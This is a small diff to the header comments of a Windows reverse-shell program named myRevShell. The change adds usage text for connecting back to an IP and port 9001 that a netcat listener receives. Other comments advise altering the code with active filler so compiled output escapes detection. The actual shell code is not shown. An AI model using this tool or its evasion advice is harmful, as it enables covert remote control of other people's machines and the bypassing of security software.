@@ -1,7 +1,7 @@
 // Please modify the code and DONT USE AS-IS, no matter legal or illegal activity
 // And modify it in a way so Compiler Optimmization doesn't do away with your extra code. 
 // Calculate, print, whatever, do active things, not empty vars or renaming
-// Usage: myRevShell.exe 192.168.158.52 9001
+// Usage: myRevShell.exe 192.168.158.52 9001 and on the receiving end your usual nc listener
 
 #define _WINSOCK_DEPRECATED_NO_WARNINGS
 #include <vector>
